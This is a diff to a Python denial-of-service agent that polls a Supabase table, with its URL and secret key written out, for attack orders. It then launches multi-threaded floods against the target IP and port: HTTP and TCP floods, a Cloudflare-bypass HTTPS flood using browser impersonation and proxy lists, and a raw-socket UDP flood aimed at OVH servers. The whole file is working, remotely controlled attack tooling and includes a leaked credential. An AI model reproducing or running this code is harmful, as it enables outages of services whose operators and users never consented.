@@ -1,6 +1,3 @@
- 
-
-
 import socket
 import os
 import random
@@ -8,6 +5,12 @@ from threading import Thread
 import multiprocessing
 import time
 import sys
+import json
+import ssl
+from struct import pack as data_pack
+
+
+_made__ = "Alexander"
 
 try:
     import requests
@@ -21,8 +24,21 @@ except:
     os.system("pip3 install cloudscraper")
     import cloudscraper
 
+try:
+    from curl_cffi import requests as curl_requests
+except:
+    os.system("pip3 install curl_cffi")
+    from curl_cffi import requests as curl_requests
+
+try:
+    from impacket.ImpactPacket import IP, UDP, Data
+except:
+    os.system("pip3 install impacket")
+    from impacket.ImpactPacket import IP, UDP, Data
+
 SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
 SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"
+PROXY_URL = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"
 
 HEADERS = {
     "apikey": SUPABASE_KEY,
@@ -30,117 +46,151 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
+USER_AGENTS_URL = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
+
+def get_my_ip():
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except:
+        return "127.0.0.1"
+
+MY_IP = get_my_ip()
+
 def MyUser_Agent():
-    return [
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
-        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/"
-    ]
+    try:
+        response = requests.get(USER_AGENTS_URL, timeout=10)
+        if response.status_code == 200:
+            user_agents = response.text.strip().split('\n')
+            if user_agents:
+                return user_agents
+    except:
+        pass
+    return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"]
+
+def get_proxies():
+    try:
+        response = requests.get(PROXY_URL, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            proxies = []
+            for item in data.get('data', []):
+                ip = item.get('ip')
+                port = item.get('port')
+                protocols = item.get('protocols', [])
+                if ip and port:
+                    for protocol in protocols:
+                        if protocol.lower() in ['http', 'https', 'socks4', 'socks5']:
+                            proxies.append(f"{protocol.lower()}://{ip}:{port}")
+            return proxies
+    except:
+        return []
 
 def launch_bypass_https(url, duration, threads=700):
     end_time = time.time() + duration
+    browsers = ["chrome110", "chrome116", "chrome119", "chrome120", "safari17_0"]
+    user_agents = MyUser_Agent()
+    
     def attack_thread():
         scraper = cloudscraper.create_scraper()
         while time.time() < end_time:
             try:
-                scraper.get(url, timeout=10)
+                browser = random.choice(browsers)
+                headers = {'User-Agent': random.choice(user_agents)}
+                curl_requests.get(url, impersonate=browser, headers=headers, timeout=10)
+            except:
+                try: scraper.get(url, timeout=10)
+                except: pass
+    
+    for _ in range(threads):
+        Thread(target=attack_thread, daemon=True).start()
+    time.sleep(duration)
+
+def ovh_udp_attack(ip_addr, port, duration, threads=700):
+    end_time = time.time() + duration
+    methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
+    paths = ['/0/0/0/0/0/0', '/', '/null', '/%00%00%00%00']
+
+    def attack_thread():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as s:
+                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                while time.time() < end_time:
+                    ip_pkt = IP()
+                    ip_pkt.set_ip_src(MY_IP)
+                    ip_pkt.set_ip_dst(ip_addr)
+                    
+                    udp_pkt = UDP()
+                    udp_pkt.set_uh_sport(random.randint(1024, 65535))
+                    udp_pkt.set_uh_dport(port)
+                    
+                    payload_str = f"{random.choice(methods)} {random.choice(paths)}{os.urandom(1024).decode('latin1', 'ignore')} HTTP/1.1\nHost: {ip_addr}:{port}\r\n\r\n"
+                    udp_pkt.contains(Data(payload_str.encode("latin1", "ignore")))
+                    ip_pkt.contains(udp_pkt)
+                    
+                    s.sendto(ip_pkt.get_packet(), (ip_addr, port))
+        except:
+            pass
+
+    for _ in range(threads):
+        Thread(target=attack_thread, daemon=True).start()
+    time.sleep(duration)
+
+def tcp_attack(ip, port, duration, threads=700):
+    end_time = time.time() + duration
+    def attack_thread():
+        while time.time() < end_time:
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                    sock.connect((ip, port))
+                    sock.send(os.urandom(1024))
             except:
                 pass
     for _ in range(threads):
         Thread(target=attack_thread, daemon=True).start()
     time.sleep(duration)
 
-def tcp_attack(ip, port, duration, threads=700, packet_size=65500):
-    end_time = time.time() + duration
-    def attack_thread():
-        while time.time() < end_time:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                try:
-                    sock.connect((ip, port))
-                    while time.time() < end_time:
-                        sock.send(random._urandom(packet_size))
-                except:
-                    pass
-    for _ in range(threads):
-        Thread(target=attack_thread, daemon=True).start()
-    time.sleep(duration)
-
 def moonHttp(host_http, port, duration):
     end_time = time.time() + duration
+    user_agents = MyUser_Agent()
     while time.time() < end_time:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
                 mysocket.connect((host_http, port))
-                while time.time() < end_time:
-                    mysocket.send(f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(MyUser_Agent())}\r\nConnection: keep-alive\r\n\r\n'.encode())
+                mysocket.send(f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n'.encode())
         except:
             pass
 
 def execute_attack(method, ip, port, duration):
-    method_upper = method.upper()
-    print(f"[*] Started Task: {method_upper} on {ip}:{port} for {duration}s")
+    m = method.upper()
+    print(f"[*] Started Task: {m} on {ip}:{port}")
     
-    if method_upper == "HTTP":
-        threads_list = []
-        for _ in range(700):
-            thd = Thread(target=moonHttp, args=(ip, port, duration), daemon=True)
-            thd.start()
+    if m == "HTTP":
+        for _ in range(700): Thread(target=moonHttp, args=(ip, port, duration), daemon=True).start()
         time.sleep(duration)
-    
-    elif method_upper == "TCP":
+    elif m == "TCP":
         tcp_attack(ip, port, duration)
-    
-    elif method_upper == "BYPASS-HTTPS":
+    elif m == "BYPASS-HTTPS":
         launch_bypass_https(ip, duration)
+    elif m == "OVH-UDP":
+        ovh_udp_attack(ip, port, duration)
     
-    print(f"[!] Task Finished: {method_upper} on {ip}:{port}")
-
-
-
-
-
-
-
-
-
+    print(f"[!] Task Finished: {m}")
 
 def check_new_requests():
-    print("System Running... Listening for new requests.")
+    print(f"Start Server Loader Wait Requests {_made__}")
     last_id = 0
-    
-    try:
-        response = requests.get(f"{SUPABASE_URL}?select=id&order=id.desc&limit=1", headers=HEADERS)
-        if response.status_code == 200 and response.json():
-            last_id = response.json()[0]['id']
-    except:
-        pass
-
     while True:
         try:
-            response = requests.get(f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1", headers=HEADERS)
-            if response.status_code == 200:
-                data = response.json()
-                if data and data[0]['id'] > last_id:
-                    req = data[0]
+            r = requests.get(f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1", headers=HEADERS)
+            if r.status_code == 200 and r.json():
+                req = r.json()[0]
+                if req['id'] > last_id:
+                    if last_id != 0:
+                        multiprocessing.Process(target=execute_attack, args=(req['method'], req['ip'], int(req['port']), int(req.get('Time', 60)))).start()
                     last_id = req['id']
-                    
-                    # تشغيل الهجوم في عملية منفصلة تماماً
-                    p = multiprocessing.Process(
-                        target=execute_attack, 
-                        args=(req['method'], req['ip'], int(req['port']), int(req.get('Time', 60)))
-                    )
-                    p.start()
-                    print(f"[+] New Process Started for ID: {last_id}")
-        except Exception as e:
-            print(f"Error: {e}")
-        
+        except: pass
         time.sleep(2)
 
 if __name__ == "__main__":
